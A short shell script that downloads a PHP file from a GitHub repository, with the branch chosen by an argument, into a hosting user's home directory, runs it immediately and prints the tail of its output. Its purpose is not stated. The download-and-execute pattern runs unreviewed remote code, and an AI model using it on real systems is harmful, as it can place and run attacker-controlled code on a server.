#!/bin/sh
cd /home/u791571885 && curl -fsSL -o t160.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vs160.php" && /opt/alt/php83/usr/bin/php t160.php 2>&1 | tail -c 9000
